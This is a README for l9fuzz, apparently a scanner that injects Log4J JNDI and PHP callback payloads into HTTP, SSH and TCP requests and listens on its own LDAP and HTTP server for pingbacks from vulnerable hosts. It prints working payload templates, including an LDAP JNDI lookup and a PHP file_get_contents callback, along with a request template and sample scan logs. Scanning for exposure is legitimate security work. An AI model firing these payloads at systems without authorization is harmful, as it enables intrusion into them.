# l9fuzz

Fuzzes various protocols with signed payloads and listen for ping backs.

## Features

- Low CPU/Memory footprint
- Integrated LDAP/HTTP server
- Trace orignal source and vector
- Gets a direct IP and not a DNS resolver
- Basic usage of HTTP/SSH
- Use of templating with multiple tokens over TCP/SSL

## Use cases

- Log4J/JNDI LDAP scanning
- PHP STDIN
- Make your own templates

## Usage

```
Usage: l9fuzz scan --listen-address=STRING --input-file=INPUT-FILE

Flags:
  -h, --help                       Show context-sensitive help.

  -l, --listen-address=STRING      Listen address (ip:port)
  -i, --input-file=INPUT-FILE      Input file, - for STDIN
  -o, --output-file=OUTPUT-FILE    Output file
  -m, --max-connections=100        Max connections
  -k, --psk="no-payload-check"     Payload sign key
  -r, --request-template=STRING    Uses a custom request template
  -p, --payload-template=STRING    Uses a custom payload
  -t, --timeout=2s                 Timeout (LDAP,http,tcp...)
  -w, --wait=1m                    Wait for ping after scan is done
  -q, --quiet                      No progress bar
  -L, --ldap-debug=LDAP-DEBUG      LDAP server debug log file
  -d, --debug                      Debug
```

## Input file format

```
http://12.44.55.66:8000/test
ssh://34.54.33.22:22
ssh://32.54.33.32:22
ssh://34.54.33.25:2222
tls://43.33.44.11:8081
tcp://12.12.12.12:23
55.21.45.11:8080
```

No scheme means `tcp://`.`tcp://`, `tls://` and `ssl://` are only supported in template mode.

## Output

```
$ ./l9fuzz scan -i - -m 400 -l 167.71.13.196:45432 
Started server at 167.71.13.196:45432
[ldap-reply] From: 14.201.105.110:51428 | Source: https://24.201.106.150:443 | Vector: http-header-x-forwarded-for | Delay: 1.849171982s
[ldap-reply] From: 14.201.105.110:51426 | Source: https://24.201.106.150:443 | Vector: http-url-path | Delay: 1.850494525s
[ldap-reply] From: 257.130.120.178:55897 | Source: http://45.199.107.194:80 | Vector: http-url-query-key | Delay: 14.506910982s
[ldap-reply] From: 257.130.120.178:10247 | Source: http://45.199.107.194:80 | Vector: http-url-query-key | Delay: 14.537421598s
[ldap-reply] From: 257.130.120.178:3467 | Source: http://45.199.107.194:80 | Vector: http-url-query-key | Delay: 14.54305658s
[ldap-reply] From: 257.130.120.178:29311 | Source: http://45.199.107.194:80 | Vector: http-url-query-key | Delay: 14.577900357s
[ldap-reply] From: 257.130.120.178:45846 | Source: http://45.199.107.194:80 | Vector: http-url-query-value | Delay: 14.764612109s

$ ./l9fuzz scan -t templates/requests/http.txt -p templates/payloads/log4j215.txt -i source.txt -l 127.0.0.1:4555
[ldap-reply] From: 257.130.120.178:45846 | Source: http://45.199.107.194:80 | Vector: http-url-query-value | Delay: 14.764612109s

```

## Template mode

### Payload templating

If `-p template-file.txt` is specified, the payload is assembled
from `template-file.txt`.

eg: 

```
${jndi:ldap://{{ .Fuzzer.ListenIp }}:{{ .Fuzzer.LDAPPort}}/{{ .Hash }}}
```
or
```
<?php file_get_contents('http://{{ .Fuzzer.ListenIp }}:{{ .Fuzzer.HTTPPort }}/{{ .Hash }}'); ?>
```


Available port are :

- `{{ .Fuzzer.LDAPPort }}`
- `{{ .Fuzzer.HTTPPort }}`

### Request templating

If `-r template-file.txt` is specified, `template-file.txt` is sent
over the TCP/SSL connection instead of using the default payloads.

This allows for specifying your own requests while keeping track of fields :

eg `http.txt`:

```
PUT {{ .Fuzzer.PayloadJNDILog4J .Url.String "http-raw-url" }} HTTP/1.1
Host: {{ .Fuzzer.PayloadJNDILog4J .Url.String "http-header-host" }}
X-My-Header: {{ .Fuzzer.PayloadJNDILog4J .Url.String "http-x-my-header" }}

{{ .Fuzzer.PayloadJNDILog4J .Url.String "http-put-body" }}

```

2 payload methods are available :

- `.Fuzzer.PayloadJNDILog4J` -> Default, generates a JNDILog4j payload
- `.Fuzzer.Payload` -> Uses the payload provided with `-p`


## Notes

This tool uses signed payloads. It can wait indefinitely for pings, even
after a restart if necessary.